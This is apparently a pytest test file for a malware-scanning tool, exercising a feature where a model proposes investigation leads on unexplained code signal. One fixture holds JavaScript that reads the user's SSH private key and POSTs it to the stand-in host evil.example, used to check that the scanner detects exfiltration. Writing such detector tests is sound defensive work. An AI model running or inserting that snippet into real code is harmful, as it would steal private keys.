"""Adaptive investigation leads — the model-steered complement to catalog coverage.

The model proposes WHERE to look on RESIDUE (signal that composed into no finding); the
deterministic engine executes the lead and judges. Leads only ADD coverage. Exercised
with pydantic-ai's TestModel (no network) + a fake in-repo provider.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

pytest.importorskip("pydantic_ai")
from pydantic_ai.models.test import TestModel  # noqa: E402

from unmask import MCDConfig, run_mcd  # noqa: E402

# A file with signal across >=2 capability families that composes into no BP-* — residue.
_RESIDUE_PY = "import platform, os\nprint(platform.system())\nx = os.environ.get('HOME')\nimport time; time.time()\n"

# What a fake deobfuscator would recover if a lead force-opened the residue: exfil.
_EXFIL_JS = (
    'const http=require("http");\n'
    'const fs=require("fs");\n'
    'const key=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa");\n'
    'http.request({host:"evil.example",method:"POST"}).end(key);\n'
)


def _toolchain_with(*providers):
    from unmask.providers import ProviderInfo, ToolchainStatus
    st = ToolchainStatus()
    for p in providers:
        st.providers.append(ProviderInfo(id=p.id, capabilities=list(p.capabilities),
                                         source="test", instance=p))
    return st


def _lead_model(*leads):
    return TestModel(custom_output_args={"leads": list(leads)})


def _pkg(tmp_path):
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "info.py").write_text(_RESIDUE_PY)
    return d


# --- units -----------------------------------------------------------------

def test_gather_residue_finds_uncomposed_signal(tmp_path):
    from unmask.leads import gather_residue
    from unmask.scanner.native import NativeScanner
    from unmask.scanner.observe import observe
    obs, inv = observe(str(_pkg(tmp_path)))
    scan = NativeScanner().compose_assess_render(obs, inv, str(tmp_path))
    residue = gather_residue(scan)
    assert any(r["path"] == "info.py" and len(r["families"]) >= 2 for r in residue)


def test_propose_leads_filters_to_valid_targets():
    from unmask.leads import propose_leads
    residue = [{"path": "info.py", "atoms": ["SYSI.OS"], "families": ["SYSI", "TIME"]}]
    leads = propose_leads(residue, agent=None,
                          model=_lead_model({"kind": "human", "target": "info.py", "rationale": "r"},
                                            {"kind": "human", "target": "NOT_RESIDUE", "rationale": "r"}))
    assert [ld.target for ld in leads] == ["info.py"]  # off-residue target dropped


# --- graph -----------------------------------------------------------------

def test_leads_off_by_default_has_no_section(tmp_path):
    result = run_mcd(str(_pkg(tmp_path)), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    report = json.loads(Path(result.report_paths["json"]).read_text())
    assert "leads" not in report


def test_human_lead_is_proposed_and_tracked(tmp_path):
    model = _lead_model({"kind": "human", "target": "info.py", "rationale": "unexplained env+sysinfo"})
    result = run_mcd(str(_pkg(tmp_path)), MCDConfig(storage_root=str(tmp_path / ".mcd"), leads=True),
                     review_model=model)
    report = json.loads(Path(result.report_paths["json"]).read_text())
    proposed = report["leads"]["proposed"]
    assert any(p["target"] == "info.py" and p["kind"] == "human" and p["resolution"] == "human"
               for p in proposed)


class _FakeLeadDeobfuscator:
    id = "fake-lead-deobf"
    capabilities = ["deobfuscate"]

    def can_handle(self, artifact):
        return artifact.kind == "obfuscated-source"

    def transform(self, artifact, workdir):
        from unmask.transform import DerivedSource, TransformResult
        out = Path(workdir) / "recovered"
        out.mkdir(parents=True, exist_ok=True)
        (out / "payload.js").write_text(_EXFIL_JS)
        return TransformResult(
            provider_id=self.id, artifact=artifact.logical_path, capability="deobfuscate",
            derived=[DerivedSource(root=str(out), origin=f"{artifact.logical_path}»lead",
                                   method="deobfuscate")])


def test_transform_lead_surfaces_hidden_finding(tmp_path, monkeypatch):
    import unmask.run as runmod
    monkeypatch.setattr(runmod, "discover_providers",
                        lambda: _toolchain_with(_FakeLeadDeobfuscator()))
    model = _lead_model({"kind": "transform", "target": "info.py", "rationale": "looks packed"})
    result = run_mcd(str(_pkg(tmp_path)), MCDConfig(storage_root=str(tmp_path / ".mcd"), leads=True),
                     review_model=model)
    report = json.loads(Path(result.report_paths["json"]).read_text())
    comps = set(report["summary"].get("compositions") or [])
    # The exfil is impossible without the lead force-opening the residue file.
    assert {"BP-EXFIL", "BP-CREDTHEFT"} & comps
    lead = next(p for p in report["leads"]["proposed"] if p["target"] == "info.py")
    assert lead["kind"] == "transform" and lead["resolution"] == "finding"
    assert result.disposition in {"review", "quarantine"}


def test_transform_lead_without_provider_is_unactionable(tmp_path, monkeypatch):
    import unmask.run as runmod
    from unmask.providers import ToolchainStatus
    monkeypatch.setattr(runmod, "discover_providers", lambda: ToolchainStatus())  # nothing installed
    model = _lead_model({"kind": "transform", "target": "info.py", "rationale": "looks packed"})
    result = run_mcd(str(_pkg(tmp_path)), MCDConfig(storage_root=str(tmp_path / ".mcd"), leads=True),
                     review_model=model)
    report = json.loads(Path(result.report_paths["json"]).read_text())
    lead = next(p for p in report["leads"]["proposed"] if p["target"] == "info.py")
    assert lead["resolution"] == "unactionable"  # tracked, not silently dropped
